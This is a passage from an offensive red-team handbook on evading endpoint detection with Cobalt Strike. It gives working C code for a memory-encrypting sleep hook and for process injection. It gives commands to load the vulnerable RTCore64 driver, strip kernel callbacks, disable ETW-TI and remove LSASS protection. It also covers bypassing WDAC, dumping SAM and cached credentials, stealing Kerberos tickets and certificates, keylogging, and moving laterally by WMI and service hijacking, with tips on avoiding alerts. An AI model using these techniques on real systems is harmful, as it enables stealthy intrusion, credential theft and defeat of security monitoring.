        if (start[i] == 0x0F && start[i+1] == 0x05 && start[i+2] == 0xC3)
            return &start[i];
    }
    return NULL;
}

// 3. Execute: set SSN in eax, args in registers, JMP to gadget
// The return address on the stack points into ntdll — clean for EDR stack walks

References: Maldev Academy resources · Outflank blog

11.4.3 Memory Obfuscation

  • Encrypt Beacon memory during sleep:
    • Hook the Sleep API via PICO
    • Before sleeping: XOR or RC4 encrypt all Beacon PE sections in memory
    • After waking: decrypt, restore permissions, continue execution
    • This is the equivalent of Cobalt Strike’s Sleepmask
  • Clean up loader artifacts:
    • Free the loader’s memory region after Beacon is running
    • Zero out any staging buffers that held decrypted shellcode
    • Overwrite with memset(addr, 0, size) before freeing
  • Handle memory scanners during execution:
    • Keep execution time between sleeps as short as possible
    • Avoid long-running operations that keep Beacon decrypted
    • Consider garbling PE headers even during execution
// Sleep Mask — encrypt Beacon memory during sleep (PICO Sleep hook)
void WINAPI _hook_Sleep(DWORD dwMilliseconds) {
    // 1. Generate a random key for this sleep cycle
    BYTE key[16];
    BCryptGenRandom(NULL, key, sizeof(key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    // 2. Walk Beacon PE sections and XOR-encrypt each one
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(beaconNtHeaders);
    for (WORD i = 0; i < beaconNtHeaders->FileHeader.NumberOfSections; i++) {
        LPBYTE secAddr = beaconBase + sec[i].VirtualAddress;
        DWORD  secSize = sec[i].Misc.VirtualSize;

        // Flip to RW so we can encrypt executable sections
        DWORD oldProt;
        VirtualProtect(secAddr, secSize, PAGE_READWRITE, &oldProt);

        // XOR encrypt in place
        for (DWORD j = 0; j < secSize; j++)
            secAddr[j] ^= key[j % sizeof(key)];
    }

    // 3. Actually sleep
    pRealSleep(dwMilliseconds);

    // 4. Decrypt and restore original section permissions
    sec = IMAGE_FIRST_SECTION(beaconNtHeaders);
    for (WORD i = 0; i < beaconNtHeaders->FileHeader.NumberOfSections; i++) {
        LPBYTE secAddr = beaconBase + sec[i].VirtualAddress;
        DWORD  secSize = sec[i].Misc.VirtualSize;
        for (DWORD j = 0; j < secSize; j++)
            secAddr[j] ^= key[j % sizeof(key)];

        DWORD protect = PAGE_READONLY;
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            protect = PAGE_EXECUTE_READ;
        else if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            protect = PAGE_READWRITE;
        VirtualProtect(secAddr, secSize, protect, &oldProt);
    }

    // 5. Zero the key — never leave it in memory
    SecureZeroMemory(key, sizeof(key));
}

General references: Cobalt Strike user guide · Maldev Academy resources · Outflank blog

11.5 Post-Exploitation Evasion

Post-exploitation commands generate their own telemetry. Control how each command executes, where it injects, and what signatures it leaves behind.

11.5.1 BOF Execution

  • Prefer BOFs over fork-and-run:
    • BOFs execute inline in the Beacon process — no child process, no injection
    • Compile as COFF object files, loaded via Beacon’s COFF loader
    • Output returns via Beacon’s named pipe, not stdout
  • Configure the process-inject block for BOFs:
    • bof_allocator — controls memory allocation strategy
    • startrwx false — never start with RWX permissions
    • userwx false — never leave memory as RWX after execution
    • bof_reuse_memory true — reuse allocated memory across BOF calls
# Malleable C2 — process-inject block for BOF and post-ex
process-inject {
    set bof_allocator      "VirtualAlloc";
    set bof_reuse_memory   "true";
    set startrwx           "false";
    set userwx             "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        CreateRemoteThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        RtlCreateUserThread;
    }
}
  • Test BOF compatibility:
    • Not all tools have BOF equivalents
    • Verify the BOF produces correct output against a test target
    • Watch for BOFs that crash the Beacon process on failure

11.5.2 Fork & Run Hardening

  • Hook the spawn and inject paths:
    • PROCESS_INJECT_SPAWN — BOF hook for fork-and-run spawn operations
    • PROCESS_INJECT_EXPLICIT — BOF hook for explicit injection into existing processes
    • These hooks let you control how the sacrificial process is created and injected
  • Set a clean thread start address:
    • ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x2c"
    • The injected thread’s start address will point into ntdll, not your payload
    • EDRs check the thread start address against known-good module ranges
  • Patch AMSI in the post-ex loader:
    • The post-ex DLL runs .NET assemblies (execute-assembly, powerpick)
    • AMSI will scan the loaded assembly unless patched in the spawned process
    • Patch before any .NET content is loaded
// PROCESS_INJECT_SPAWN BOF hook — controls fork-and-run injection
// Called when Beacon runs execute-assembly, powerpick, etc.
void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    // 1. Create sacrificial process (suspended)
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcessA(NULL, "C:\\Windows\\System32\\dllhost.exe",
        NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // 2. Allocate memory in the remote process (RW, not RWX)
    LPVOID remoteBuf = VirtualAllocEx(pi.hProcess, NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 3. Write the post-ex DLL
    WriteProcessMemory(pi.hProcess, remoteBuf, payload, payloadSize, NULL);

    // 4. Flip to RX before execution
    DWORD oldProt;
    VirtualProtectEx(pi.hProcess, remoteBuf, payloadSize,
        PAGE_EXECUTE_READ, &oldProt);

    // 5. Set thread start to a clean address
    //    ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x2c"
    //    (configured in the Aggressor script)

    // 6. Resume the thread
    ResumeThread(pi.hThread);
}

11.5.3 Tool Signature Stripping

  • Strip post-ex DLL signatures:
    • Use the POSTEX_RDLL_GENERATE Aggressor hook
    • Apply strrep_pad() to remove known strings from each post-ex reflective DLL
    • Target: mimikatz strings, Rubeus GUIDs, Seatbelt markers
  • Strip tool signatures before loading:
    • Replace static GUIDs in .NET assemblies with random values
    • Remove comment blocks and debug strings from PowerShell scripts
    • Recompile C# tools with renamed namespaces and obfuscated strings
  • Validate with memory scanners:
    • Run the post-ex command in a test environment with the target EDR
    • Check for detection during execution, not just at load time
    • Iterate until the command completes without alerts

References: Cobalt Strike user guide · Outflank blog

General references: Cobalt Strike user guide · Outflank blog

11.6 Kernel-Mode Bypasses

When user-mode evasion is insufficient, use a vulnerable kernel driver to disable EDR components at the kernel level. This is the most invasive evasion layer.

11.6.1 Vulnerable Driver Loading

  • Select a known-vulnerable driver:
    • RTCore64.sys (Micro-Star) — arbitrary kernel read/write
    • dbutil_2_3.sys (Dell) — arbitrary kernel read/write
    • Confirm the driver is not blocklisted by the target’s driver block policy
  • Install and start the driver:
    • sc create RTCore64 type= kernel binPath= C:\\Windows\\Temp\\RTCore64.sys start= demand
    • sc start RTCore64
    • Verify the driver loaded: check for the device object or service status
# Install and start a vulnerable kernel driver
sc create RTCore64 type= kernel binPath= C:\Windows\Temp\RTCore64.sys start= demand
sc start RTCore64

# Cleanup after operations
sc stop RTCore64
sc delete RTCore64
del C:\Windows\Temp\RTCore64.sys
  • Plan for cleanup:
    • sc stop RTCore64 and sc delete RTCore64 after operations
    • Delete the driver file from disk
    • The driver load itself generates ETW and Sysmon events — operate quickly

11.6.2 Callback Removal

  • Enumerate all kernel callbacks:
    • list_callbacks — shows process, thread, image load, handle, and registry callbacks
    • Identify which callbacks belong to the target EDR driver (e.g., WdFilter.sys for Defender)
  • Remove specific callbacks:
    • remove_callback 0 WdFilter.sys — remove Defender’s first process creation callback
    • Remove handle callbacks to allow opening protected processes (LSASS)
    • Remove image load callbacks to prevent DLL load monitoring
# Kernel callback operations
list_callbacks                          # enumerate all kernel callbacks
remove_callback 0 WdFilter.sys         # remove Defender's process creation callback
remove_callback 1 WdFilter.sys         # remove Defender's thread creation callback
  • Validate the removal:
    • Attempt the previously-blocked operation (e.g., open LSASS handle)
    • Confirm no EDR alert fires
    • Re-run list_callbacks to confirm the entry is gone

11.6.3 ETW-TI Disabling

  • Understand ETW Threat Intelligence:
    • Provider GUID: {{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}}
    • ETW-TI feeds telemetry to EDRs for process injection, credential access, and more
    • Bucket index formula: (Data1 ^ Data2 ^ Data4[0] ^ Data4[4]) & 0x3F
  • Check ETW-TI status:
    • etw_enum {{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}}
    • Shows whether the provider is enabled and which sessions consume it
  • Disable the provider:
    • etw_disable {{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}}
    • Underlying mechanism: patch ProviderEnableInfo.IsEnabled to 0 in kernel memory
    • Validate: perform a monitored action and confirm no ETW-TI event fires
# ETW-TI operations
etw_enum {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}     # check ETW-TI provider status
etw_disable {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}   # disable the provider

References: Maldev Academy resources · MDSec research

11.6.4 PPL Manipulation

  • Check process protection level:
    • ppenum [pid] — shows the current protection level
    • Protected processes (PPL) cannot be opened with PROCESS_ALL_ACCESS
    • LSASS runs as PPL on modern Windows when Credential Guard or RunAsPPL is enabled
  • Remove PPL protection:
    • pppatch [pid] 0 — sets protection to PsProtectedSignerNone
    • This requires kernel read/write via the vulnerable driver
    • After patching, the process can be opened normally
# PPL operations
ppenum 672         # check protection level of process (PID 672 = lsass.exe)
pppatch 672 0      # set protection to PsProtectedSignerNone
  • Validate and operate:
    • Open a handle to the now-unprotected process
    • Dump credentials or inject as needed
    • PPL removal is persistent until the process restarts
Kernel Callback Types — Quick Reference
Callback Type Registration API EDR Use Bypass Method
Process creation PsSetCreateProcessNotifyRoutineEx Alert on new processes, block suspicious spawns Zero function pointer in callback array
Thread creation PsSetCreateThreadNotifyRoutine Detect remote thread injection Zero function pointer in callback array
Image load PsSetLoadImageNotifyRoutine Monitor DLL and driver loads Zero function pointer in callback array
Object handle ObRegisterCallbacks Block LSASS handle opens, prevent process kill Set Active = 0 in callback structure
Registry CmRegisterCallbackEx Monitor persistence via registry writes Unlink from doubly-linked callback list

General references: Maldev Academy resources · MDSec research · RastaMouse

11.7 WDAC Bypass

Windows Defender Application Control restricts which binaries can execute. Analyze the policy, identify gaps, and exploit them to run unsigned code.

11.7.1 Policy Analysis

  • Extract and decompile the WDAC policy:
    • ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath policy.cip -XmlFilePath policy.xml
    • The XML reveals all allow/deny rules, signers, and file attributes
# Decompile WDAC binary policy to human-readable XML
ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath .\SiPolicy.p7b -XmlFilePath .\policy.xml
  • Check critical rule options:
    • Enabled:Audit Mode — policy logs but does not block (easy bypass)
    • Enabled:UMCI — User Mode Code Integrity is enforced
    • Enabled:Unsigned System Integrity Policy — policy itself is unsigned (modifiable)
    • Enabled:Dynamic Code Security — blocks .NET/PS dynamic code generation
    • Enabled:Runtime FilePath Rule Protection — enforces path-based rules
  • Map the allowed execution surface:
    • List all trusted signers and their certificate chains
    • List all allowed file hashes and file attributes
    • Identify path-based rules and check if those paths are writable

11.7.2 Bypass Techniques

  • File attribute spoofing via Artifact Kit:
    • Modify resource.rc to set OriginalFilename and ProductName to match an allowed binary
    • Recompile the payload with the spoofed attributes
    • Only works when the policy uses file attribute rules, not hash or signer rules
  • Path wildcard abuse:
    • If the policy allows execution from a wildcard path (e.g., C:\\Windows\\*)
    • Find a writable subdirectory within the allowed path
    • Drop the payload there and execute
  • Living-off-the-land binaries:
    • Microsoft.Workflow.Compiler.exe — compiles and executes C# from an XML input
    • Only works when Dynamic Code Security is not enabled
    • The binary is Microsoft-signed and typically allowed by WDAC policies
# LOTL WDAC bypass — Microsoft.Workflow.Compiler.exe
# payload.xml contains C# code to execute
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe payload.xml results.xml
  • Electron application abuse:
    • Teams, VS Code, and other Electron apps have unsigned ASAR bundles
    • Swap the JavaScript in the ASAR with your payload code
    • The signed Electron binary loads the modified ASAR without WDAC blocking

References: Bohops WDAC research · MITRE T1027 Obfuscation

11.7.3 Code Signing

  • Sign payloads with an obtained certificate:
    • signtool.exe sign /f cert.pfx /p password /fd SHA256 payload.exe
    • The certificate must chain to a trusted root in the WDAC policy
# Sign a payload with a code-signing certificate
signtool.exe sign /f cert.pfx /p password /fd SHA256 /t http://timestamp.digicert.com payload.exe
  • Obtain a certificate from ADCS:
    • Find a certificate template with Domain Users enroll rights
    • Request a code-signing certificate from the internal CA
    • Use the issued cert to sign payloads — they will be trusted by the WDAC policy
  • Supplemental policy injection:
    • Requires Unsigned System Integrity Policy + Update Policy No Reboot enabled
    • Author a supplemental policy that allows your payload hash or signer
    • Deploy it alongside the base policy — takes effect without reboot

General references: Bohops WDAC research · MITRE T1027 Obfuscation

11.8 Credential Access Under Protection

Credential Guard and PPL protect LSASS from direct memory access. Use alternative credential sources and Kerberos ticket operations to authenticate without dumping plaintext passwords.

11.8.1 Service Ticket Extraction

  • Enumerate available tickets:
    • Rubeus triage — list all cached Kerberos tickets by LUID
    • Identify TGTs and service tickets for high-value targets
    • Service tickets are NOT protected by Credential Guard
  • Extract specific tickets:
    • Rubeus dump /luid:0x3e7 /service:krbtgt /nowrap — dump a specific ticket by LUID and service
    • Base64-encoded ticket can be used for pass-the-ticket
  • Import and use tickets:
    • Rubeus ptt /ticket:doIFqj... — inject the ticket into the current session
    • Access the target service using the imported ticket
  • Request new service tickets via LSA:
    • Rubeus asktgs /service:cifs/target.domain.com /luid:0x3e7
    • Requests a new TGS using an existing TGT — does not touch LSASS memory
# Rubeus ticket workflow under Credential Guard
Rubeus triage                                                    # list all cached tickets by LUID
Rubeus dump /luid:0x3e7 /service:krbtgt /nowrap                  # extract a specific ticket
Rubeus ptt /ticket:doIFqj...                                     # inject ticket into current session
Rubeus asktgs /service:cifs/fileserver.domain.com /luid:0x3e7    # request new service ticket via LSA

11.8.2 Certificate-Based Authentication

  • Extract certificates with DPAPI:
    • SharpDPAPI certificates /unprotect — extract user certificates
    • SharpDPAPI certificates /machine — extract machine certificates
    • Outputs PEM-encoded certificates and private keys
  • Convert to PFX for Kerberos auth:
    • openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
  • Authenticate via PKINIT:
    • Rubeus asktgt /user:target /domain:domain.com /certificate:cert.pfx /password:pass
    • Returns a TGT for the certificate’s identity — bypasses Credential Guard entirely
    • Works even when the user’s password is unknown
# Certificate-based authentication — full chain
SharpDPAPI certificates /unprotect                   # extract user certificates via DPAPI
SharpDPAPI certificates /machine                     # extract machine certificates

# Convert PEM to PFX for Kerberos auth
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Authenticate via PKINIT — bypasses Credential Guard
Rubeus asktgt /user:admin /domain:domain.com /certificate:cert.pfx /password:pfxpass /nowrap

11.8.3 Alternative Credential Sources

  • SAM database (local accounts):
    • Extract via registry save or volume shadow copy
    • Crack NTLM hashes offline or use pass-the-hash
  • Domain Cached Credentials (DCC2):
    • Stored in the registry for offline domain logon
    • Slow to crack (PBKDF2) but may yield domain creds on disconnected laptops
  • Keylogging:
    • Deploy a keylogger to capture plaintext credentials as users type
    • Target RDP sessions and password prompts
    • Effective against Credential Guard since it captures input, not memory
  • Third-party credential stores:
    • Browser saved passwords (Chrome, Edge, Firefox)
    • Password managers (KeePass databases, LastPass agents)
    • SSH keys, cloud credentials, VPN configs
# SAM dump via registry save (requires SYSTEM)
reg save HKLM\SAM C:\Windows\Temp\sam.bak
reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak
# Exfil and crack offline:
impacket-secretsdump -sam sam.bak -system sys.bak LOCAL

# Domain Cached Credentials (DCC2) — extract with mimikatz or secretsdump
impacket-secretsdump -sam sam.bak -system sys.bak -security sec.bak LOCAL
# Crack DCC2 hashes (slow — PBKDF2):
hashcat -m 2100 dcc2.txt wordlist.txt

# Chrome saved passwords (user context, requires DPAPI)
SharpChrome logins /unprotect

# Keylogging via Beacon
keylogger [pid] [x86|x64]       # inject keylogger into a process
# Output captured in Beacon's keystrokes tab

General references: HackTricks AD · Cobalt Strike user guide

11.9 User Impersonation

Assume the identity of other users through token manipulation and Kerberos ticket operations while maintaining OPSEC under EDR monitoring.

11.9.1 Token Operations

  • Create a token with known credentials:
    • make_token — uses LogonUserA to create a network logon token (type 9)
    • Creds are used for network authentication only — local commands still run as original user
    • Blend with the legitimate binary: use it through a RunAs-style wrapper
  • Create a sacrificial process for ticket injection:
    • Rubeus createnetonly /program:C:\\Windows\\System32\\cmd.exe /show:false
    • Uses CreateProcessWithLogonW — creates a new logon session
    • Inject tickets into this session to impersonate without modifying your Beacon’s token
  • Steal a token from an existing process:
    • steal_token [pid] — duplicates the token from a running process
    • Use OPSEC-safe APIs: open the process through syscalls with call stack spoofing
    • Avoid opening high-integrity tokens unless necessary — handle operations trigger EDR
  • Revert to original identity:
    • rev2self — drops the impersonated token and returns to the Beacon’s original context
    • Always revert before performing actions that should be attributed to the implant’s service account
# Token operations workflow
make_token DOMAIN\targetuser P@ssw0rd    # create network logon token (type 9)
ls \\fileserver\c$                        # access network resources as targetuser
rev2self                                  # revert to original Beacon identity

# Alternative: steal from running process
steal_token 4820                          # duplicate token from PID 4820
ls \\dc01\c$                              # operate as that process's user
rev2self                                  # revert

# Sacrificial process for ticket injection
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show:false
# inject tickets into the new logon session

11.9.2 Kerberos Under EDR

  • Ticket operations are still viable:
    • Dump tickets from memory and pass-the-ticket works regardless of EDR
    • EDRs focus on LSASS access, not ticket parsing
    • Use BOF-based ticket extraction to avoid fork-and-run detection
  • Raw Kerberos traffic from non-LSASS is suspicious:
    • Tools that build AS-REQ/TGS-REQ from userland generate port-88 traffic from your process
    • EDRs flag non-LSASS processes communicating on port 88
    • Prefer injecting tickets into LSASS via PTT over building your own Kerberos packets
  • OPSEC-safe Kerberos workflow:
    • Extract: BOF-based ticket dump from the current session
    • Import: PTT into a sacrificial logon session
    • Operate: use the imported ticket for network authentication
    • Clean: purge tickets when done to avoid leaving evidence
# OPSEC-safe Kerberos workflow under EDR
# 1. Create sacrificial logon session (avoids touching Beacon's session)
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show:false
#    [+] ProcessID: 5412, LUID: 0x7a3bc2

# 2. Extract ticket via BOF (inline, no child process)
Rubeus triage                                   # list available tickets
Rubeus dump /luid:0x3e7 /service:krbtgt /nowrap  # dump TGT

# 3. Import into the sacrificial session (PTT goes through LSASS — expected traffic)
Rubeus ptt /luid:0x7a3bc2 /ticket:doIFqj...

# 4. Steal the sacrificial process token to operate as that identity
steal_token 5412
ls \\dc01\c$

# 5. Clean up when done
rev2self                                        # drop the stolen token
Rubeus purge /luid:0x7a3bc2                     # purge tickets from the session
kill 5412                                       # terminate sacrificial process

General references: Cobalt Strike user guide · HackTricks AD

11.10 Lateral Movement

Move between hosts while maintaining evasion tradecraft. Every spawned Beacon must inherit the full evasion pipeline — loader, hooks, syscalls, and signature stripping.

11.10.1 WMI

  • Hook CoCreateInstance for OPSEC:
    • WMI lateral movement calls CoCreateInstance to create a remote WMI object
    • Hook this API through PICO to add call stack spoofing
    • EDRs monitor COM object creation for lateral movement patterns
  • Stage the payload on the target:
    • Upload the payload to C:\\Windows\\System32\\ or another system directory
    • System directories are less suspicious than Temp or user profile paths
    • Code-sign the payload if WDAC is enforced on the target
  • Handle recently-created file detection:
    • Some EDRs flag files executed within seconds of creation
    • Delay execution: upload first, wait, then trigger via WMI
    • Use a LOLBAS binary as an indirect launcher to break the creation-to-execution chain
# WMI lateral movement — stage payload, then trigger remotely
# 1. Upload payload to target via SMB
upload C:\payloads\beacon.exe \\TARGET\C$\Windows\System32\svcmon.exe

# 2. Remote execution via WMI (Beacon)
remote-exec wmi TARGET C:\Windows\System32\svcmon.exe

# 3. Alternative: PowerShell WMI one-liner (from attacker box)
#    Uses Win32_Process.Create — executes as SYSTEM if run with DA creds
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "C:\Windows\System32\svcmon.exe" `
  -ComputerName TARGET

# 4. Indirect execution via LOLBAS to break parent-child chain
remote-exec wmi TARGET "C:\Windows\System32\rundll32.exe C:\Windows\System32\svcmon.dll,Entry"

11.10.2 PsExec & SCShell

  • Avoid the default PsExec pattern:
    • UNC path in the service binPath is heavily signatured
    • Upload the payload manually via SMB, then create a service with a local path
    • Or use SCShell: hijack an existing service’s binPath without creating a new service
  • SCShell for OPSEC-safe service abuse:
    • Modify an existing stopped service to point to your payload
    • Start the service, which executes the payload
    • Restore the original binPath after execution
    • No new service creation event — only a service modification
  • Clean up service artifacts:
    • Restore original service configuration
    • Delete the uploaded payload
    • Verify no orphaned services remain
# SCShell — hijack an existing stopped service instead of creating a new one
# 1. Find a stopped service to hijack
sc \\TARGET query state= inactive | findstr SERVICE_NAME

# 2. Save original binPath for cleanup
sc \\TARGET qc "SensorService" | findstr BINARY_PATH_NAME
#    e.g. C:\Windows\System32\SensorService.dll

# 3. Modify the service to point to your payload
sc \\TARGET config "SensorService" binPath= "C:\Windows\System32\svcmon.exe"

# 4. Start the hijacked service (executes payload as SYSTEM)
sc \\TARGET start "SensorService"

# 5. Cleanup — restore the original binPath and delete the payload
sc \\TARGET config "SensorService" binPath= "C:\Windows\System32\SensorService.dll"
del \\TARGET\C$\Windows\System32\svcmon.exe

# PsExec-style with local path (not UNC — avoids the default PsExec signature)
# 1. Upload payload via SMB
upload C:\payloads\beacon.exe \\TARGET\C$\Windows\System32\svcmon.exe
# 2. Create and start a service with a local path
sc \\TARGET create SvcMon binPath= "C:\Windows\System32\svcmon.exe" start= demand
sc \\TARGET start SvcMon
# 3. Cleanup
sc \\TARGET delete SvcMon
del \\TARGET\C$\Windows\System32\svcmon.exe

11.10.3 Spawned Beacon Tradecraft

  • Ensure spawned Beacons inherit evasion:
    • Use the BEACON_RDLL_GENERATE_LOCAL Aggressor hook
    • This hook lets you apply the same Crystal Palace / PICO tradecraft to every new Beacon
    • Without it, laterally-moved Beacons use the default (detectable) loader
  • Code-sign the lateral movement payload:
    • Use the same code-signing certificate from the WDAC bypass phase
    • Signed payloads bypass both WDAC and some EDR static-analysis checks
  • Use LOLBAS for indirect execution:
    • Instead of directly executing the payload, use a legitimate binary as a launcher
    • Examples: rundll32.exe, regsvr32.exe, mshta.exe
    • Breaks the direct process-creation chain from the lateral movement tool
  • Validate the full chain before operating:
    • Test lateral movement in a lab with the target EDR
    • Confirm the spawned Beacon callbacks without alerts
    • Verify the Beacon has full post-ex capability (sleep mask, BOFs, PICO hooks)
# Aggressor — BEACON_RDLL_GENERATE_LOCAL ensures every spawned Beacon
# inherits the full Crystal Palace / PICO evasion pipeline
set BEACON_RDLL_GENERATE_LOCAL {
    local('$dll $pico');
    $dll = $2;
    # Apply all strrep_pad signature removals
    $dll = strrep_pad($dll, "beacon.x64.dll",   "survey.x64.dll");
    $dll = strrep_pad($dll, "ReflectiveLoader",  "UpdateCheckProc");
    # Attach the Crystal Palace loader + PICO hooks
    return build_crystal_palace($dll);
}

# Lateral movement: sign + move + execute
# 1. Sign the payload (if WDAC enforced)
signtool.exe sign /f cert.pfx /p password /fd SHA256 beacon.exe

# 2. Upload via Beacon
upload C:\payloads\beacon.exe \\TARGET\C$\Windows\System32\svcmon.exe

# 3. Execute via service hijack or WMI
remote-exec wmi TARGET "C:\Windows\System32\rundll32.exe C:\Windows\System32\svcmon.dll,DllMain"

# 4. Confirm new Beacon checks in with full evasion
#    Verify: sleep mask active, PICO hooks loaded, no RWX memory
Evasion Layer Decision Table
Detection Point Technique Implementation OPSEC Notes
Disk (static sigs) Signature removal + resource encryption strrep_pad(), XOR masking, Crystal Palace PIC Re-scan after every profile change
Load time (IAT, RWX) Dynamic resolution + per-section permissions DFR pattern, walk section headers post-load No RWX pages should survive loader
API calls (user-mode hooks) Direct/indirect syscalls + unhooking RecycledGate, PICO hooks, clean ntdll overwrite Combine with call stack spoofing
Call stack inspection Synthetic frames + JOP gadget Draugr, spoof_call(), RtlUserThreadStart frames Validate under debugger before deployment
Memory scanning (sleep) Encrypt PE sections during sleep PICO Sleep hook, XOR/RC4, zero staging buffers Keep active execution windows short
Post-ex telemetry BOFs over fork-and-run, thread start spoofing process-inject block, ObfSetThreadContext, AMSI patch Strip all tool signatures before loading
Kernel telemetry Callback removal, ETW-TI disable, PPL patch Vulnerable driver (RTCore64, dbutil) Driver load itself generates events — be fast

General references: Cobalt Strike user guide · MITRE T1021 Remote Services
